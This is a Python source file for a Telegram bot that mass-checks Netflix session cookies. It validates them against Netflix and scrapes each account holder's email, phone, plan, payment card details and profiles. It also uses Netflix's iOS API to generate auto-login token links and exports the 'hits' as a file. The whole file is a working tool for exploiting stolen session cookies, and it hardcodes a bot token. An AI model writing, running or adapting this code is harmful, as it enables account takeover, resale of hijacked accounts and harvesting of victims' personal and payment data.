#!/usr/bin/env python3
"""
Netflix Cookie Checker Telegram Bot
"""
import logging
import requests
import json
import re
import zipfile
import io
import time
import concurrent.futures as _cf
from datetime import datetime
from typing import Dict, List, Tuple, Optional
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

TOKEN = "8629103001:AAFNQZWXtcl04llWmHxADAP-oHhsEYNl3mc"
MAX_FILE_SIZE = 20 * 1024 * 1024

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# ── Netflix iOS API for NFToken (works with just NetflixId!) ──────────────────
NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
NFTOKEN_PARAMS = {
    "appVersion": "15.48.1",
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-A2111-D4F5B3A6E7C8D9E0F1A2B3C4D5E6F7A8B9C0D1E2F3A4B5C6",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "pathFormat": "graph",
    "responseFormat": "json",
    "path": '["account","token","default"]',
    "config": json.dumps({"device_type": "NFAPPL-02-", "idiom": "phone", "iosVersion": "15.8.5", "appVersion": "15.48.1"}),
}
NFTOKEN_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "Accept": "application/json",
    "Accept-Language": "en-US,en;q=0.9",
    "x-netflix.client.type": "argo",
    "x-netflix.request.routing": json.dumps({"path": "/nq/mobile/nqios/~15.48.0/user", "control_tag": "iosui_argo"}),
    "x-netflix.context": "{}",
    "x-netflix.profiles": "{}",
    "x-netflix.app-version": "15.48.1",
    "x-netflix.idiom": "phone",
    "x-netflix.os.version": "15.8.5",
    "x-netflix.device.model": "iPhone8,1",
}

BROWSER_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
    "Cache-Control": "max-age=0",
}

PLAN_MAP = {
    "standard with ads": {"name": "Standard with Ads", "quality": "1080p", "streams": 2},
    "standard": {"name": "Standard", "quality": "1080p", "streams": 2},
    "basic": {"name": "Basic", "quality": "480p", "streams": 1},
    "mobile": {"name": "Mobile", "quality": "480p", "streams": 1},
    "premium": {"name": "Premium", "quality": "4K+HDR", "streams": 4},
}

QUALITY_MAP = {
    "UHD": "4K+HDR", "ULTRA_HD": "4K+HDR", "HD": "1080p",
    "HIGH": "1080p", "MEDIUM": "720p", "SD": "480p", "LOW": "480p",
}


def _decode_js_hex(s: str) -> str:
    return re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), s)


def _parse_date(val) -> str:
    if not val:
        return ""
    s = str(val).strip()
    try:
        s = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), s)
    except Exception:
        pass
    s = s.replace("\\x20", " ").strip()
    if re.match(r'^\d+$', s):
        ts = int(s)
        try:
            if ts > 9_999_999_999:
                return datetime.utcfromtimestamp(ts / 1000).strftime("%B %Y")
            return datetime.utcfromtimestamp(ts).strftime("%B %Y")
        except Exception:
            pass
    m = re.match(r'^(\d{4})-(\d{2})-(\d{2})', s)
    if m:
        try:
            return datetime(int(m.group(1)), int(m.group(2)), int(m.group(3))).strftime("%B %d, %Y")
        except Exception:
            pass
    if re.search(r'[A-Za-z]', s) and re.search(r'\d', s):
        return s
    return s


def _brace_extract(html: str, start_pos: int):
    raw = _decode_js_hex(html[start_pos:start_pos + 500000])
    if not raw:
        return None
    depth = 0
    in_str = False
    esc = False
    for i, c in enumerate(raw):
        if esc:
            esc = False
        elif c == '\\' and in_str:
            esc = True
        elif c == '"':
            in_str = not in_str
        elif not in_str:
            if c in '{[':
                depth += 1
            elif c in ']}':
                depth -= 1
                if depth == 0:
                    try:
                        return json.loads(raw[:i + 1])
                    except Exception:
                        return None
    return None


def _extract_reactcontext(html: str) -> dict:
    for anchor in ["netflix.reactContext = {", "netflix.reactContext={"]:
        pos = html.find(anchor)
        if pos == -1:
            continue
        brace_pos = html.index("{", pos + len(anchor) - 1)
        raw_chunk = html[brace_pos: brace_pos + 3_000_000]
        raw_fixed = _decode_js_hex(raw_chunk)
        depth = 0
        in_str = False
        esc = False
        i = 0
        while i < len(raw_fixed):
            c = raw_fixed[i]
            if esc:
                esc = False
            elif c == "\\" and in_str:
                esc = True
            elif c == '"':
                in_str = not in_str
            elif not in_str:
                if c == "{":
                    depth += 1
                elif c == "}":
                    depth -= 1
                    if depth == 0:
                        try:
                            return json.loads(raw_fixed[:i + 1])
                        except json.JSONDecodeError:
                            pass
                        break
            i += 1
    return {}


def _extract_userinfo(html: str) -> dict:
    m = re.search(r'"userInfo"\s*:\s*\{[^{]*"data"\s*:\s*(\{)', html)
    if not m:
        return {}
    result = _brace_extract(html, m.start(1))
    return result if isinstance(result, dict) else {}


def _falcon_val(field):
    if isinstance(field, dict):
        return field.get("value")
    return field


def _extract_member_plan(html: str) -> dict:
    result = {}
    m = re.search(r'"currentPlan"\s*:\s*\{[^{]*"fieldGroup"\s*:\s*"MemberPlan"\s*,\s*"fields"\s*:\s*(\{)', html)
    if not m:
        m = re.search(r'"fieldGroup"\s*:\s*"MemberPlan"\s*,\s*"fields"\s*:\s*(\{)', html)
    if not m:
        return result
    fields = _brace_extract(html, m.start(1))
    if not isinstance(fields, dict):
        return result
    fv = _falcon_val
    plan_name = fv(fields.get("localizedPlanName")) or fv(fields.get("planName"))
    raw_quality = fv(fields.get("videoQuality"))
    max_streams = fv(fields.get("maxStreams"))
    has_ads = fv(fields.get("hasAds"))
    next_billing_raw = fv(fields.get("nextBillingDate"))
    price_raw = fv(fields.get("planPrice")) or fv(fields.get("formattedPlanPrice"))
    is_on_hold = fv(fields.get("isOnHold"))
    if plan_name:
        result["plan_name"] = str(plan_name)
    if raw_quality:
        q = str(raw_quality).upper()
        result["quality"] = QUALITY_MAP.get(q, str(raw_quality))
    if max_streams is not None:
        result["max_streams"] = str(max_streams)
    if has_ads is not None:
        result["has_ads"] = bool(has_ads)
    if next_billing_raw:
        result["next_billing"] = _parse_date(str(next_billing_raw))
    if price_raw:
        result["price"] = str(price_raw).replace('\u00a0', ' ').strip()
    if is_on_hold is not None:
        result["is_on_hold"] = bool(is_on_hold)
    return result


def _extract_billing_date(html: str) -> str:
    html_decoded = _decode_js_hex(html)
    patterns = [
        r'"nextBillingDate"\s*:\s*\{"fieldType"\s*:\s*"[^"]+"\s*,\s*"value"\s*:\s*"([^"]+)"',
        r'"nextBillingDate"\s*:\s*\{\s*"value"\s*:\s*"([^"]+)"',
        r'"nextBillingDate"\s*:\s*(\d{10,13})',
        r'"renewalDate"\s*:\s*"([^"]+)"',
    ]
    for pat in patterns:
        for m in re.finditer(pat, html_decoded, re.IGNORECASE):
            candidate = m.group(1).strip()
            if '{' in candidate or candidate == 'null':
                continue
            result = _parse_date(candidate)
            if result:
                return result
    return ""


def _extract_payment_info(html: str) -> dict:
    result = {}
    html_decoded = _decode_js_hex(html)
    m = re.search(r'"paymentMethods"\s*:\s*\{"fieldType"\s*:\s*"Custom"\s*,\s*"value"\s*:\s*(\[)', html_decoded)
    if not m:
        m = re.search(r'"paymentMethods"\s*:\s*\{[^\[]*"value"\s*:\s*(\[)', html_decoded)
    if not m:
        return result
    arr = _brace_extract(html_decoded, m.start(1))
    if not isinstance(arr, list) or not arr:
        return result
    first = arr[0]
    if not isinstance(first, dict) or "value" not in first:
        return result
    pm = first["value"]
    if not isinstance(pm, dict):
        return result

    def fv(key):
        f = pm.get(key, {})
        if isinstance(f, dict):
            return f.get("value")
        return f

    partner = fv("partnerDisplayName")
    is_third = fv("thirdPartyBillingPartner")
    card_type = fv("creditCardType") or fv("paymentType")
    last_four = fv("cardLastFour") or fv("lastFourDigits") or fv("lastFour")
    exp_mo = fv("cardExpirationMonth")
    exp_yr = fv("cardExpirationYear")
    alt_method = fv("paymentMethod")
    display_text = fv("displayText")

    result["is_third_party"] = bool(is_third)
    result["partner_name"] = str(partner) if partner else ""

    parts = []
    if partner and is_third:
        parts.append(str(partner))
        result["card_type"] = str(partner)
    elif card_type:
        ct = str(card_type)
        result["card_type"] = ct.upper() if len(ct) <= 10 else ct.title()
        parts.append(result["card_type"])
        if last_four:
            result["card_last4"] = str(last_four)
            parts.append(f"({last_four})")
        if exp_mo and exp_yr:
            exp_str = f"{str(exp_mo).zfill(2)}/{str(exp_yr)[-2:]}"
            result["card_expiry"] = exp_str
    elif alt_method:
        method_str = str(alt_method).upper()
        disp = str(display_text).strip() if display_text else ""
        if disp:
            parts.append(f"{method_str}: {disp}")
        else:
            parts.append(method_str)
        result["card_type"] = method_str

    result["payment"] = " ".join(parts) if parts else ""
    return result


def _extract_profiles(html: str) -> list:
    """Extract all profile names - checks falcorCache and profileName fields"""
    html_decoded = _decode_js_hex(html)
    names = []
    seen = set()

    # Method 1: falcorCache has ALL profiles with full data
    fc_match = re.search(r'netflix\.falcorCache\s*=\s*(\{.+?\});\s*</script>', html, re.DOTALL)
    if fc_match:
        try:
            fc_text = _decode_js_hex(fc_match.group(1))
            fc_data = json.loads(fc_text)
            profiles_raw = fc_data.get('profiles', {})
            if isinstance(profiles_raw, dict):
                for guid, pdata in profiles_raw.items():
                    if not isinstance(pdata, dict):
                        continue
                    summary = pdata.get('summary', {})
                    if isinstance(summary, dict):
                        if summary.get('$type') == 'atom':
                            val = summary.get('value', {})
                            if isinstance(val, dict):
                                pname = val.get('profileName', '')
                                if pname and len(pname) < 60 and pname not in seen:
                                    seen.add(pname)
                                    names.append(pname)
        except Exception:
            pass

    # Method 2: Regex on full HTML as fallback
    if not names:
        for m in re.finditer(r'"profileName"\s*:\s*"([^"]{1,60})"', html_decoded):
            name = m.group(1).strip()
            if name and name not in seen:
                seen.add(name)
                names.append(name)

    return names


def _extract_phone(html: str) -> str:
    html_decoded = _decode_js_hex(html)
    for m in re.finditer(r'"phoneNumber"\s*:\s*"([^"]{5,25})"', html_decoded):
        ph = m.group(1).strip()
        if ph and ph != 'null' and not ph.startswith('1-866'):
            return ph
    return ""


def generate_nftoken(cookies: dict) -> dict:
    """Generate NFToken using iOS API - works with just NetflixId!"""
    netflix_id = cookies.get("NetflixId") or cookies.get("netflixId")
    if not netflix_id:
        return {"success": False, "error": "NetflixId cookie not found"}
    try:
        resp = requests.get(
            NFTOKEN_API_URL,
            params=NFTOKEN_PARAMS,
            headers={**NFTOKEN_HEADERS, "Cookie": f"NetflixId={netflix_id}"},
            timeout=10,
        )
        if resp.status_code != 200:
            return {"success": False, "error": f"API returned HTTP {resp.status_code}"}
        data = resp.json()
        token_data = data.get("value", {}).get("account", {}).get("token", {}).get("default", {})
        token = token_data.get("token")
        if not token:
            return {"success": False, "error": "Token not found in response"}
        return {
            "success": True,
            "token": token,
            "pc_url": f"https://netflix.com/?nftoken={token}",
            "mobile_url": f"https://netflix.com/unsupported?nftoken={token}",
            "tv_url": f"https://netflix.com/tv2?nftoken={token}",
        }
    except requests.exceptions.Timeout:
        return {"success": False, "error": "NFToken request timed out"}
    except Exception as e:
        return {"success": False, "error": str(e)}


def parse_cookies(text: str) -> dict:
    """Parse cookies from any format"""
    text = text.strip()
    if not text:
        return {}

    # JSON format
    if text.startswith('[') or text.startswith('{'):
        try:
            data = json.loads(text)
            cookies = {}
            if isinstance(data, list):
                for item in data:
                    if isinstance(item, dict) and 'name' in item and 'value' in item:
                        cookies[item['name']] = item['value']
            elif isinstance(data, dict):
                cookies = data
            if cookies:
                return cookies
        except Exception:
            pass

    # Netscape format
    cookies = {}
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        parts = line.split('\t')
        if len(parts) >= 7:
            cookies[parts[5].strip()] = parts[6].strip()
    if cookies:
        return cookies

    # Raw cookie string
    cookies = {}
    for part in text.replace('\n', '; ').split(';'):
        part = part.strip()
        if '=' in part:
            name, _, value = part.partition('=')
            name = name.strip()
            if name and len(name) < 80:
                cookies[name] = value.strip()
    return cookies


def check_netflix_cookie(cookie_text: str) -> dict:
    """
    Full Netflix cookie checker using /account/membership page + iOS NFToken API
    """
    cookies = parse_cookies(cookie_text)
    if not cookies or 'NetflixId' not in cookies:
        return {"status": "invalid", "message": "No NetflixId cookie found"}

    session = requests.Session()
    session.headers.update(BROWSER_HEADERS)

    def _fetch_account():
        try:
            r = session.get(
                "https://www.netflix.com/account/membership",
                cookies=cookies,
                timeout=15,
                allow_redirects=True
            )
            if r.status_code == 200 and len(r.text) > 1000:
                if 'login' not in r.url and '"signupContext":"login"' not in r.text[:3000]:
                    return "OK", r.text
            # Try browse as fallback
            r2 = session.get(
                "https://www.netflix.com/browse",
                cookies=cookies,
                timeout=15,
                allow_redirects=True
            )
            if 'login' in r2.url or '"signupContext":"login"' in r2.text[:3000]:
                return "INVALID", r2.text
            if r2.status_code == 200 and len(r2.text) > 1000:
                return "OK", r2.text
            return "INVALID", ""
        except Exception as e:
            return "ERROR", str(e)

    def _fetch_token():
        return generate_nftoken(cookies)

    # Fetch account info and token in parallel
    with _cf.ThreadPoolExecutor(max_workers=2) as pool:
        f_account = pool.submit(_fetch_account)
        f_token = pool.submit(_fetch_token)
        acct_status, acct_text = f_account.result()
        try:
            nft = f_token.result(timeout=12)
        except Exception:
            nft = {"success": False, "error": "timeout"}

    if acct_status == "INVALID":
        return {"status": "invalid", "message": "Cookie is expired or invalid"}
    if acct_status == "ERROR" or not acct_text:
        return {"status": "error", "message": "Could not reach Netflix"}

    result = {"status": "hit"}

    # Extract userInfo
    userinfo = _extract_userinfo(acct_text)

    # Email
    email = None
    if userinfo:
        email = userinfo.get("emailAddress") or userinfo.get("email")
    if not email:
        html_d = _decode_js_hex(acct_text)
        for pat in [r'"emailAddress"\s*:\s*"([^"@]+@[^"]+)"',
                    r'"email"\s*:\s*"([^"@]{1,60}@[^"]{3,60})"',
                    r'"primaryEmail"\s*:\s*"([^"@]+@[^"]+)"']:
            m = re.search(pat, html_d)
            if m:
                cand = m.group(1).strip()
                if '@' in cand and '.' in cand.split('@')[1]:
                    email = cand
                    break
    result["email"] = email or "N/A"

    # Country
    country = None
    if userinfo:
        country = userinfo.get("countryOfSignup") or userinfo.get("memberCountry")
    if not country:
        html_d = _decode_js_hex(acct_text)
        m = re.search(r'"countryOfSignup"\s*:\s*"([A-Z]{2,3})"', html_d)
        if m:
            country = m.group(1)
    result["country"] = country or "N/A"

    # Member Since
    member_since = None
    if userinfo:
        raw = userinfo.get("memberSince") or userinfo.get("joinDate")
        if raw:
            member_since = _parse_date(str(raw))
    if not member_since:
        html_d = _decode_js_hex(acct_text)
        m = re.search(r'"memberSince"\s*:\s*"([^"]+)"', html_d, re.IGNORECASE)
        if m:
            member_since = _parse_date(m.group(1))
    result["member_since"] = member_since or "N/A"

    # Plan info from MemberPlan fieldGroup
    plan_info = _extract_member_plan(acct_text)
    plan_name = plan_info.get("plan_name", "")
    quality = plan_info.get("quality", "")
    max_streams = plan_info.get("max_streams", "")

    if plan_name and (not quality or not max_streams):
        for key, info in PLAN_MAP.items():
            if key in plan_name.lower():
                quality = quality or info["quality"]
                max_streams = max_streams or str(info["streams"])
                break

    if not plan_name:
        html_lower = acct_text.lower()
        for key, info in PLAN_MAP.items():
            if key in html_lower:
                plan_name = info["name"]
                quality = quality or info["quality"]
                max_streams = max_streams or str(info["streams"])
                break

    result["plan"] = plan_name or "N/A"
    result["quality"] = quality or "N/A"
    result["max_streams"] = max_streams or "N/A"

    # Renewal / Next billing
    next_billing = plan_info.get("next_billing") or _extract_billing_date(acct_text)
    result["renewal"] = next_billing or "N/A"

    # Price
    result["price"] = plan_info.get("price", "N/A") or "N/A"

    # Payment
    pay_info = _extract_payment_info(acct_text)
    payment = pay_info.get("payment", "")
    if not payment:
        html_d = _decode_js_hex(acct_text)
        for pat in [r'"paymentType"\s*:\s*"([^"]+)"',
                    r'"creditCardType"\s*:\s*"([^"]+)"',
                    r'\b(Visa|Mastercard|VISA|MASTERCARD|American Express|PayPal|Discover)\b']:
            m = re.search(pat, html_d, re.IGNORECASE)
            if m:
                payment = m.group(1).strip()
                break
    result["payment"] = payment or "N/A"

    # Phone
    result["phone"] = _extract_phone(acct_text) or "N/A"

    # Profiles - fetch browse page which has ALL profiles in falcorCache
    profiles = []
    try:
        browse_resp = session.get(
            "https://www.netflix.com/browse",
            cookies=cookies,
            timeout=15,
            allow_redirects=True
        )
        if browse_resp.status_code == 200 and len(browse_resp.text) > 1000:
            profiles = _extract_profiles(browse_resp.text)
    except Exception:
        pass

    # Fallback to account page if browse didn't get profiles
    if not profiles:
        profiles = _extract_profiles(acct_text)

    result["profiles"] = ", ".join(profiles) if profiles else "N/A"

    # NFToken links
    if nft.get("success"):
        result["pc_link"] = nft["pc_url"]
        result["mobile_link"] = nft["mobile_url"]
        result["tv_link"] = nft["tv_url"]
        result["has_token"] = True
    else:
        result["pc_link"] = "https://www.netflix.com/browse"
        result["mobile_link"] = "https://www.netflix.com/browse"
        result["tv_link"] = "https://www.netflix.com/browse"
        result["has_token"] = False
        result["token_error"] = nft.get("error", "")

    return result


# ── Telegram Bot ──────────────────────────────────────────────────────────────

checker_session = requests.Session()


def build_hit_message(result: dict, hit_num: int = None) -> str:
    title = f'✅ #{hit_num} NETFLIX HIT 💎' if hit_num else '✅ NETFLIX HIT ⭐'
    plan = result.get('plan', 'N/A')
    quality = result.get('quality', '')
    max_streams = result.get('max_streams', '')
    plan_str = plan
    if quality and quality != 'N/A':
        plan_str += f' ({quality})'

    pc = result.get('pc_link', 'https://www.netflix.com/browse')
    mobile = result.get('mobile_link', 'https://www.netflix.com/browse')
    tv = result.get('tv_link', 'https://www.netflix.com/browse')

    return (
        f'━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n'
        f'{title}\n'
        f'━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n'
        f'📧 Email: {result.get("email", "N/A")}\n'
        f'📦 Plan: {plan_str}\n'
        f'🌍 Country: {result.get("country", "N/A")}\n'
        f'📅 Renewal: {result.get("renewal", "N/A")}\n'
        f'🕐 Member Since: {result.get("member_since", "N/A")}\n'
        f'💳 Payment: {result.get("payment", "N/A")}\n'
        f'📱 Phone: {result.get("phone", "N/A")}\n'
        f'👥 Profiles: {result.get("profiles", "N/A")}\n'
        f'━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n'
        f'🖥 <a href="{pc}">PC Login</a> | 📱 <a href="{mobile}">Mobile</a> | 📺 <a href="{tv}">TV</a>\n'
        f'━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'
    )


async def button_handler(update, context):
    query = update.callback_query
    await query.answer()
    if query.data == 'check_cookie':
        await query.message.reply_text(
            '🍪 Paste your Netflix cookie below:\n\n'
            'Supported: Netscape, JSON, Raw formats'
        )
    elif query.data == 'upload_file':
        context.user_data['batch_mode'] = True
        await query.message.reply_text(
            '🎬 Netflix Checker\n\n'
            'Send me a Netflix cookie file (.txt or .zip) to check accounts.\n\n'
            'Supported formats:\n'
            '• JSON (Cookie Editor export)\n'
            '• Netscape .txt format\n'
            '• Raw key=value cookie text\n\n'
            'Multi-account: Put multiple cookie sets in one file.\n'
            'Results: plan, quality, profiles & billing.'
        )
    elif query.data == 'my_stats':
        await query.message.reply_text('📊 My Stats coming soon!')
    elif query.data == 'leaderboard':
        await query.message.reply_text('🏆 Leaderboard coming soon!')
    elif query.data == 'help':
        await query.message.reply_text(
            '❓ Help\n\n'
            '• Paste a Netflix cookie directly to check it\n'
            '• Use /chk <cookie> for single check\n'
            '• Use /batch then upload a .txt or .zip file\n\n'
            'Supported formats: Netscape, JSON, Raw'
        )


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("🍪 Check Cookie", callback_data='check_cookie'),
         InlineKeyboardButton("📁 Upload File", callback_data='upload_file')],
        [InlineKeyboardButton("📊 My Stats", callback_data='my_stats'),
         InlineKeyboardButton("🏆 Leaderboard", callback_data='leaderboard')],
        [InlineKeyboardButton("❓ Help", callback_data='help')]
    ]
    await update.message.reply_text(
        '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n'
        '🎬 NETFLIX COOKIE CHECKER BOT\n'
        '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n'
        f'Welcome, {update.message.from_user.first_name}! 👋\n\n'
        '💠 Validate Netflix cookies instantly\n'
        '💠 Full capture: Email, Plan, Country, Payment\n'
        '💠 PC / Mobile / TV login links\n'
        '💠 Supports JSON, Netscape & raw formats\n'
        '💠 Mass check via .txt or .zip upload\n\n'
        '🔑 API Status: ✅ Active\n'
        '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n'
        '⚡ Paste a cookie or upload a file to start!\n'
        '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━',
        reply_markup=InlineKeyboardMarkup(keyboard)
    )


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await start(update, context)


async def handle_text(update, context):
    cookie_text = update.message.text
    await update.message.chat.send_action(action="typing")
    try:
        checking_msg = await update.message.reply_text('🔍 Checking cookie...')
        start_time = datetime.now()
        result = check_netflix_cookie(cookie_text)
        elapsed = (datetime.now() - start_time).total_seconds()
        await checking_msg.delete()

        if result['status'] == 'hit':
            msg = build_hit_message(result)
            await update.message.reply_text(msg, parse_mode='HTML')
            await update.message.reply_text(
                f'━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n'
                f'🏁 CHECK COMPLETE\n'
                f'━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n'
                f'📊 Total: 1\n'
                f'✅ Valid Hits: 1\n'
                f'❌ Invalid: 0\n'
                f'🕐 Time: {elapsed:.1f}s\n'
                f'📈 Hit Rate: 100.0%\n'
                f'━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'
            )
        elif result['status'] == 'invalid':
            await update.message.reply_text(
                f'━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n'
                f'❌ Invalid Cookie\n'
                f'Error: Auto-generation failed (Account is Dead or Expired)\n'
                f'━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'
            )
        else:
            await update.message.reply_text(
                f'━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n'
                f'❌ Error\n'
                f'{result.get("message", "Unknown error")}\n'
                f'━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'
            )
    except Exception as e:
        import traceback
        print(traceback.format_exc())
        await update.message.reply_text(f'❌ Error: {str(e)}')


async def check_single(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text('❌ Usage: /chk <cookie_string>\n\nOr paste cookie directly.')
        return
    cookie_string = ' '.join(context.args)
    await update.message.chat.send_action(action="typing")
    checking_msg = await update.message.reply_text('🔍 Checking cookie...')
    result = check_netflix_cookie(cookie_string)
    await checking_msg.delete()
    if result['status'] == 'hit':
        msg = build_hit_message(result)
        await update.message.reply_text(msg, parse_mode='HTML')
    else:
        await update.message.reply_text(
            f'━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n'
            f'❌ Invalid Cookie\n'
            f'Error: Auto-generation failed (Account is Dead or Expired)\n'
            f'━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'
        )


async def batch_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['batch_mode'] = True
    await update.message.reply_text(
        '🎬 Netflix Checker\n\n'
        'Send me a Netflix cookie file (.txt or .zip) to check accounts.\n\n'
        'Supported formats:\n'
        '• JSON (Cookie Editor export)\n'
        '• Netscape .txt format\n'
        '• Raw key=value cookie text\n\n'
        'Results: plan, quality, profiles & billing.'
    )


async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    file = await update.message.document.get_file()
    if file.file_size > MAX_FILE_SIZE:
        await update.message.reply_text(f'❌ File too large. Maximum: {MAX_FILE_SIZE//1024//1024}MB')
        return

    await update.message.chat.send_action(action="typing")
    file_content = io.BytesIO()
    await file.download_to_memory(file_content)
    file_content.seek(0)
    filename = update.message.document.file_name

    # Extract all cookie texts
    cookie_texts = []
    try:
        if filename.endswith('.zip'):
            with zipfile.ZipFile(file_content) as zf:
                for name in zf.namelist():
                    if name.endswith(('.txt', '.json')):
                        with zf.open(name) as f:
                            cookie_texts.append(f.read().decode('utf-8', errors='ignore'))
        elif filename.endswith(('.txt', '.json')):
            cookie_texts.append(file_content.read().decode('utf-8', errors='ignore'))
        else:
            await update.message.reply_text('❌ Unsupported file type. Use .txt, .json or .zip')
            return
    except Exception as e:
        await update.message.reply_text(f'❌ Error reading file: {str(e)}')
        return

    # Parse all cookies
    all_cookies_text = []
    for text in cookie_texts:
        # Try to split into multiple cookie sets
        # Each set should have NetflixId
        blocks = re.split(r'\n(?=NetflixId=)', text)
        if len(blocks) > 1:
            all_cookies_text.extend([b.strip() for b in blocks if 'NetflixId' in b])
        else:
            if 'NetflixId' in text:
                all_cookies_text.append(text.strip())

    if not all_cookies_text:
        await update.message.reply_text(
            '❌ No valid Netflix cookies found.\n\n'
            'Make sure the file contains NetflixId cookies.\n'
            'Supported: JSON, Netscape .txt, raw key=value.'
        )
        return

    total = len(all_cookies_text)

    def make_bar(current, total, length=10):
        filled = int(length * current / total) if total > 0 else 0
        return '█' * filled + '░' * (length - filled)

    progress_msg = await update.message.reply_text(
        f'🎬 Netflix Checker\n\n'
        f'📈 {make_bar(0, total)} 0%\n'
        f'📊 Checked: 0 / {total}\n'
        f'✅ Hits: 0\n'
        f'❌ Dead: 0'
    )

    results = []
    hits = []
    start_time = datetime.now()
    success_count = 0
    failed_count = 0

    for i, cookie_text in enumerate(all_cookies_text, 1):
        result = check_netflix_cookie(cookie_text)
        if result['status'] == 'hit':
            success_count += 1
            hits.append(result)
        else:
            failed_count += 1
        results.append(result)

        if i % 3 == 0 or i == total:
            pct = int(100 * i / total)
            try:
                await progress_msg.edit_text(
                    f'🎬 Netflix Checker\n\n'
                    f'📈 {make_bar(i, total)} {pct}%\n'
                    f'📊 Checked: {i} / {total}\n'
                    f'✅ Hits: {success_count}\n'
                    f'❌ Dead: {failed_count}'
                )
            except Exception:
                pass

    elapsed = (datetime.now() - start_time).total_seconds()

    try:
        await progress_msg.edit_text(
            f'🎬 Netflix Checker — ✅ Complete\n\n'
            f'📈 ██████████ 100%\n'
            f'📊 Checked: {total} / {total}\n'
            f'✅ Hits: {success_count}\n'
            f'❌ Dead: {failed_count}\n'
            f'🕐 Time: {elapsed:.1f}s'
        )
    except Exception:
        pass

    hit_rate = (success_count / total * 100) if total > 0 else 0.0
    await update.message.reply_text(
        f'━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n'
        f'🏁 CHECK COMPLETE\n'
        f'━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n'
        f'📊 Total: {total}\n'
        f'✅ Valid Hits: {success_count}\n'
        f'❌ Invalid: {failed_count}\n'
        f'⚠️ Errors: 0\n'
        f'🕐 Time: {elapsed:.1f}s\n'
        f'📈 Hit Rate: {hit_rate:.1f}%\n'
        f'━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'
    )

    for idx, r in enumerate(hits, 1):
        msg = build_hit_message(r, idx)
        await update.message.reply_text(msg, parse_mode='HTML')

    if hits:
        output = io.StringIO()
        output.write(f'Netflix Hits — {success_count} account(s)\n')
        output.write(f'Time: {elapsed:.1f}s\n')
        output.write('=' * 60 + '\n\n')
        for i, r in enumerate(hits, 1):
            output.write(f'[{i}] NETFLIX HIT\n')
            output.write(f'Email: {r.get("email", "N/A")}\n')
            output.write(f'Plan: {r.get("plan", "N/A")}\n')
            output.write(f'Quality: {r.get("quality", "N/A")}\n')
            output.write(f'Country: {r.get("country", "N/A")}\n')
            output.write(f'Renewal: {r.get("renewal", "N/A")}\n')
            output.write(f'Member Since: {r.get("member_since", "N/A")}\n')
            output.write(f'Payment: {r.get("payment", "N/A")}\n')
            output.write(f'Phone: {r.get("phone", "N/A")}\n')
            output.write(f'Profiles: {r.get("profiles", "N/A")}\n')
            output.write(f'PC Link: {r.get("pc_link", "N/A")}\n')
            output.write('-' * 60 + '\n\n')
        output.seek(0)
        await update.message.reply_document(
            document=io.BytesIO(output.getvalue().encode()),
            filename=f'nf_hits_{update.message.chat_id}_{int(datetime.now().timestamp())}.txt',
            caption=f'📁 {success_count} hits exported!'
        )
    else:
        await update.message.reply_text('❌ No valid hits found in the file.')


async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Update {update} caused error {context.error}")
    try:
        if update and update.message:
            await update.message.reply_text('❌ An error occurred.')
    except Exception:
        pass


def main():
    application = Application.builder().token(TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("chk", check_single))
    application.add_handler(CommandHandler("batch", batch_command))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    application.add_error_handler(error_handler)
    print("🤖 Netflix NFToken Bot is running...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == '__main__':
    main()
